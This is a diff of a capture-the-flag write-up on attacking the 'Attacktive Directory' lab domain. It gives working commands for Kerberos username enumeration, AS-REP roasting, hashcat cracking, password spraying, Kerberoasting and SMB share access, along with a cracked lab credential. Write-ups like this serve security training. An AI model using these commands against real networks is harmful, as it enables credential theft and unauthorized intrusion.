@@ -15,7 +15,7 @@ image:
 ## TCP/139,445 (SMB)
 
 ### Crackmapexec
-1. crackmapexec
+1. Crackmapexec
 	```
 	crackmapexec smb $ip
 	```
@@ -26,9 +26,11 @@ image:
 	- Domain Name AKA DNS Domain: `spookysec.local`
 	- FQDN: `AttacktiveDirectory.spookysec.local`
 
+
+# Initial Foothold
+
 ## TCP/88 (Kerberos)
-### Kerbrute - Username Enumeration
-1. Enumerate usernames 
+1. Enumerate usernames w/ kerbrute
 	```
 	~/tools/windows-binaries/AD/kerbrute userenum --dc $ip -d spookysec.local userlist.txt -o found_users.txt
 	```
@@ -37,39 +39,36 @@ image:
 	```
 	cat found_users.txt | cut -d ':' -f4 | cut -d '@' -f1 | cut -d ' ' -f2 | sort -u |uniq --ignore-case > found_users_grep.txt
 	```
-
-###  GetNPUsers.py - AS-REP Roasting
-1. Obtain hash
+3. AS-REP Roasting w/ GetNPUsers.py
 	```
 	GetNPUsers.py spookysec.local/ -usersfile found_users_grep.txt -dc-ip=$ip
 	```
 	![Attacktivedirect AS-REP Roasting.png](Attacktivedirect%20AS-REP%20Roasting.png)
-	- Out of all the users, only `svc-admin` has `pre-auth` disabled
-2. Crack hash
+	- Out of all the enumerated users, only `svc-admin` has `pre-auth` disabled
+4. Crack hash
 	```
 	hashcat -m 18200 AS-REP_hash.txt passwordlist.txt
 	```
 	![Attacktivedirect cracking AS-REP_HASH.png](Attacktivedirect%20cracking%20AS-REP_HASH.png)
 	- svc-admin:management2005
 
-### Kerbrute - Password Spraying 
-- Password Spray
+5. Password Spraying w/ kerbrute
 	```
 	~/tools/windows-binaries/AD/kerbrute passwordspray --dc $ip -d spookysec.local found_users_grep.txt management2005 -o password_spray_results.txt
 	```
 	![Attacktivedirect password spray.png](Attacktivedirect%20password%20spray.png)
-	- Password not reused elsewhere
-
-### GetUserSPNs - Kerberoasting 
-1. Obtain kerberoast hash
+	- Password (management2005) not reused elsewhere 
+6. Kerberoasting w/ GetUserSPNs.py
 	```
 	GetUserSPNs.py spookysec.local/svc-admin:management2005 -dc-ip $ip -request
 	```
-	- Unable to find any SPN service to crack
+	- Unable to find any SPN service accounts
 
-# Initial Foothold
+## TCP/5985 (WinRM)
 1. Could not RDP/Evil-WINRM using `svc-admin`
-2. Access `svc-admin` fileshares
+
+## TCP/139,445 (SMB)
+1. Access `svc-admin` fileshares
 	```
 	smbmap -u 'svc-admin' -p 'management2005' -H $ip 
 	```
